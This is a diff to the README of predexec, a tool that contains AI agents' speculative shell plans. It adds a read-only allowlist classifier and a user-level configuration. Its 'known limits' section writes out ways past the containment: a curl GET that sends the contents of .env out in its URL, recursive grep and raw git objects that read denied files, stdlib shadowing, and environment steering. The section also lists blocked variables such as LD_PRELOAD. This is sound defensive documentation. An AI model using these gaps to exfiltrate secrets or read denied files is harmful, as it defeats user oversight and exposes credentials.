@@ -19,6 +19,14 @@ See [How it works](#how-it-works) below for the design and current status.
 > **Status: read-only.** The pure-TS core and all five adapters are done and unit-tested.
 > predexec speculates **read-only only** — any write/install/delete hard-stops before running.
 
+> **0.6.0 behavior change: unknown commands and repository scripts now stop.** Classification is
+> an allowlist: a command whose head predexec does not know is a `mutationStop`
+> (`unknown command <head>`), and so is anything that runs repository code — `bash x.sh`,
+> `./build.sh`, `python3 script.py`, `node x.js`, `node --test`, `npm test`/`npm run …`, `make`,
+> `cargo run`, `npx`, and similar. Before 0.6.0 both ran during speculation. The model recovers
+> by running that step with the host's own shell tool; to let specific commands or scripts run
+> inside a plan, list them in your [user-level configuration](#configuration).
+
 ## How it works
 
 The model fills in a **plan tree**: each node runs a batch of shell commands and/or read-only
@@ -44,6 +52,45 @@ up only when branches are genuinely predictable.
 
 HIGH-confidence (may gate deeper speculation): `exitCode`, `fileExists`, `jsonPath`, `numeric`,
 `always`. LOW-confidence (may branch only to a read-only node): `match` (regex over stdout/stderr).
+
+### What counts as read-only
+
+Classification is an **allowlist**, checked statically before any node runs (`core/destructive.ts`
+and `core/shell/`). A command is read-only only when every simple command in it is known:
+
+- a curated reader (`ls`, `cat`, `grep`, `rg`, `jq`, …), with per-head checks on the options that
+  write or execute (`sed -n 'w f'`, `sort -o`, `find -exec`, …);
+- a read verb of a multi-tool (`git`, `cargo`, `npm`/`pnpm`/`yarn`, `kubectl`, `docker`, `go`,
+  `pip`, `brew`, `gh`, `curl` GET). Any option not on that verb's own allowlist makes it mutating;
+- an interpreter one-liner (`python3 -c`, `node -e`, here-strings and heredocs) whose program the
+  language scanners and reader allowlists vet;
+- a shell builtin, or a head the user listed (see [Configuration](#configuration)).
+
+Everything else stops: an unknown head, repository code (scripts, task runners, `python3 -m` of a
+non-stdlib module, interpreters fed a program on stdin), a command name computed at run time
+(`$c`), a write redirect, a command-bearing environment variable (`PATH=.`, `NODE_OPTIONS`,
+`LD_PRELOAD`, `HOME`/`XDG_*`), and arithmetic evaluated over data-derived variables (bash
+evaluates `$((c))` as code when `c` came from `$(…)`, `read` or a loop). Anything the parser cannot
+fully see stops as well. predexec never guesses in the read-only direction.
+
+Under host permission rules, every path operand of every command is checked against the host's
+read deny/ask rules, whatever the head. An operand built from data (`xargs`, `while read` loops,
+`$(…)`) cannot be checked statically, so it stops whenever a deny or ask rule could cover it.
+
+Known limits of a static classifier:
+
+- **Python `sys.path` shadowing.** Allowed stdlib readers (`python3 -m json.tool`, imports in a
+  `-c` program) search the current directory first, so a repository file named like a stdlib
+  module runs instead. predexec cannot see the filesystem when it classifies.
+- **Network GETs can leak data in the URL.** An allowed `curl` GET sends whatever the URL holds,
+  so `curl "https://host/?q=$(cat .env)"` exfiltrates. Substitutions in operands still stop under
+  deny rules, but a plan with no deny rules can build such a URL.
+- **Recursive directory operands are not checked against deny rules.** `grep -r x .` or `rg x .`
+  reads every file under the directory, including files a host `Read(...)` rule denies. The
+  directory itself is the only operand checked (the host's own shell tool has the same gap).
+- **Raw git objects are not mapped to paths.** `git cat-file -p <sha>`/`git show <blob-sha>`, and
+  tree-wide `git grep`/`git archive`, can print a denied file's content. Mapping a hash to a path
+  would take running git.
 
 ## Harness support
 
@@ -249,6 +296,14 @@ API has no `ask`, so a static `ask` permission rule always hard-stops the plan i
 prompting (1.x can bridge it to a real host prompt via `context.ask`); and it has no file/find API
 at all, so `read`/`grep`/`find`/`ls` run through the same `mcp/tool-ops.ts` implementation Claude
 Code and Codex use, not the opencode SDK client 1.x uses.
+
+opencode 2.x also reads permission rules from agent/mode markdown files. predexec parses their YAML
+frontmatter strictly: plain `permission` keys may contain spaces and globs (`git *: allow`), and
+values may contain a bare `:` (model ids, URLs), but anything it cannot parse with certainty (a
+`: ` inside a plain value, an unquoted value js-yaml would type as something other than a string,
+such as `yes`, `~`, `0x1F` or `1e3`, tabs, anchors, …) makes that agent **deny-all** rather than
+guessed. `npx -y predexec doctor` names each
+such file with the line and reason, so quoting that value fixes it.
 
 **Prerequisites:** the [opencode](https://opencode.ai) CLI installed and authenticated for some
 provider.
@@ -562,17 +617,71 @@ enforcement are the only containment.
 A read-only, structurally predictable task — predexec's sweet spot:
 
 ```
-Detect this project's package manager and run its test script.
+Detect this project's package manager and find the command that runs its tests.
 ```
 
 The model can plan one tree: probe for a lockfile / read `package.json` scripts, branch on
-what it finds (`fileExists pnpm-lock.yaml`, `jsonPath scripts.test exists`), and run the right
+what it finds (`fileExists pnpm-lock.yaml`, `jsonPath scripts.test exists`), and read the right
 test command — resolving several branch points in a single round-trip instead of one model
-call per step. On pi and opencode, inspect the tool result's `details` (`depthReached`,
+call per step. Running the tests themselves is repository code, so that step stops
+(`mutationStop`) and the model runs it with the host's shell tool, unless you
+[allowlist](#configuration) it. On pi and opencode, inspect the tool result's `details` (`depthReached`,
 `pathTaken`, `stoppedReason`, `edgesEvaluated`/`edgesMatched`) to see the path the engine
 walked. The Claude Code MCP adapter returns only the transcript text to the model — `details`
 never reaches it there — so on Claude Code, check the transcript and run `npx -y predexec
 stats` for the same accounting.
+
+## Configuration
+
+predexec has one user-level configuration: two lists that widen what it treats as read-only.
+Both are empty by default.
+
+| setting | environment variable | `config.json` key | effect |
+| :-- | :-- | :-- | :-- |
+| extra read-only heads | `PREDEXEC_READONLY_HEADS` | `readOnlyHeads` | commands you declare pure readers, so they no longer stop as `unknown command` |
+| allowed scripts | `PREDEXEC_ALLOW_SCRIPTS` | `allowScripts` | repository scripts and task-runner commands you trust to run during speculation |
+
+Environment values are comma-separated. The file is `$XDG_CONFIG_HOME/predexec/config.json`
+(default `~/.config/predexec/config.json`); a relative `XDG_CONFIG_HOME` is ignored. The two sources
+are merged:
+
+```json
+{
+  "readOnlyHeads": ["mytool --list"],
+  "allowScripts": ["npm run lint", "scripts/report.py"]
+}
+```
+
+A file that is malformed, too large (over 64 KiB), or has an unknown key contributes nothing; the
+tool result carries a warning naming it.
+
+**How entries match.** Each entry is split into words the way a shell would, and matches when
+those words are an **exact prefix** of the command's argv (after wrappers such as `env` and leading
+`VAR=value` assignments are dropped). Trailing arguments are not checked: `npm run lint` also
+allows `npm run lint --fix`. A one-word `allowScripts` entry may instead name the script path
+itself (`scripts/report.py` allows `python3 scripts/report.py`). Only the argv is matched, so
+`./x.sh` can be allowlisted but does not cover `bash ./x.sh`, which is a different argv.
+
+An `allowScripts` entry lifts only the "runs repository script" stop; every other check still
+applies to the command. Two consequences worth knowing before you add an entry:
+
+- An allowlisted run executes code the repository controls, with your permissions. Allowlist only
+  scripts you trust not to write.
+- **Environment steering is not re-checked.** An allowlisted command can still behave differently
+  depending on the environment it inherits, such as `SHELL=./x make test`, or a tool's own config
+  file in the repository. predexec stops the command-bearing variables it knows (`PATH`,
+  `NODE_OPTIONS`, `MAKEFLAGS`, `RUSTC_WRAPPER`, …) when the plan sets them, but it cannot
+  enumerate every variable every tool reads. Environment the host injects (Claude Code project
+  `settings.json` `env`, an `.mcp.json` `env` block, Bun's automatic `.env` loading, Codex or
+  Antigravity project MCP env) is a host feature outside predexec's containment.
+
+Absolute command paths under `/usr/` (which includes `/usr/local/`), `/bin/`, `/sbin/`,
+`/opt/homebrew/` and `/nix/store/` count as system programs, not repository files. A symlink
+installed there that points into a repository is not detected.
+
+**Security: a repository cannot configure predexec.** These lists are read only from the
+environment and from the user-level file above, never from any file inside the repository or
+session root, so a cloned repository cannot allowlist `rm` or its own scripts.
 
 ## Doctor & stats
 
@@ -604,6 +713,9 @@ no skill is visible, `[!]` when **two different** predexec skills are visible to
 with opencode's own), and an `info` note when a project's `AGENTS.md` routing block and an
 installed skill are both active (harmless — the routing text just loads twice). Identical
 duplicate copies of the same skill across two discovery roots are `info`, not `[!]`.
+
+For opencode 2.x, `doctor` also parses every agent/mode markdown file it can see and reports each
+one whose frontmatter would make that agent deny-all as `[!]`, naming the file, line and reason.
 
 `install-skill` copies the packaged skill for one harness into that host's own skill directory
 (pi needs no such step — it loads the skill straight out of the installed package; opencode
@@ -655,8 +767,12 @@ core/                              PURE TS, zero harness imports (promotable to 
   types.ts conditions.ts runner.ts engine.ts destructive.ts validation.ts coerce.ts index.ts
   shell/                           single-sourced shell mechanics (lexer, host-neutral inspection,
                                     read-only heads, interpreter eval, language scanning, reader
-                                    allowlists, git, command-bearing env vars) — used by both
-                                    destructive.ts and every host policy adapter below
+                                    allowlists, git, command-bearing env vars, data taint, path
+                                    operands, repository-script detection, perl magic open, inline-
+                                    program reads) — used
+                                    by both destructive.ts and every host policy adapter below
+user-config.ts                     user-level classifier config (env + ~/.config/predexec/config.json;
+                                    never read from the repository)
 plan-language.ts                   shared plan-shape prose + tool-op syntax every adapter's tool
                                     description is built from
 yaml-frontmatter.ts                certainty-or-fail-closed YAML-frontmatter reader for opencode
@@ -676,6 +792,7 @@ mcp/                               Claude Code / Codex / Antigravity adapter (st
   policy-antigravity.ts            reads agy's settings.json grants (Deny > Ask > Allow) → policyStop, fail-closed
   toml-lite.ts                     hand-rolled TOML reader for ~/.codex/config.toml (no TOML dependency)
   gitignore-match.ts               pure gitignore-pattern matcher backing policy-claude.ts's Read/Edit rules
+  shell-path-operands.ts           resolves shell commands' path operands for the Claude/Antigravity read-rule checks
 steering.ts                        shared steering text/marker + renderSkill (harness-facing; not in core/)
 stats.ts                           request-accounting recorder (append-only JSONL; harness-facing)
 policy.ts                          opencode permission reader/checker, v1 and v2 (harness-facing)
@@ -685,7 +802,9 @@ bin/predexec-mcp.mjs               MCP entrypoint (`--host codex|antigravity` se
 scripts/gen-skills.mjs             renders every harness's SKILL.md from steering.ts (`pnpm skills`)
 scripts/sync-plugin-version.mjs    syncs every plugin manifest's version from package.json on `npm version`
 scripts/clean-build.mjs            build wrapper: compiles to a scratch dir, atomically swaps into dist/
-scripts/probes/                    throwaway measurement scripts behind docs/research/* findings
+scripts/stress-test.mjs            runs test suites concurrently to surface flaky tests
+scripts/probes/                    throwaway measurement scripts behind docs/research/* findings, plus
+                                    yaml-fuzz.mjs, the differential fuzzer against real js-yaml 3.14.2
 docs/research/*.md                 measured-not-assumed findings (codex-plugin, antigravity, opencode skills/v2)
 .pi/skills/predexec/SKILL.md       pi routing skill (loaded via pi.skills)       } generated from steering.ts
 skills/<harness>/predexec/SKILL.md claude / codex / opencode routing skills     } by `pnpm skills`;
